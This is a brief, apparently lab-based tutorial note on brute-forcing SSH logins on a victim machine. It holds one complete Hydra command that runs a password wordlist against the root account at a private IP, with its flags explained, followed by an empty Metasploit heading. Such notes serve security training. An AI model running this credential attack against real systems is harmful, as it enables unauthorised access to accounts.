- In this module here we'll be brute forcing the openssh service on the victim machine using the tool Hydra as well as metasploit
- Hydra
`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.146.129 -t 4 -v`
	 -l: user
	 -P password list
	 -t: threads
	 -v: verbosity

- Metasploit
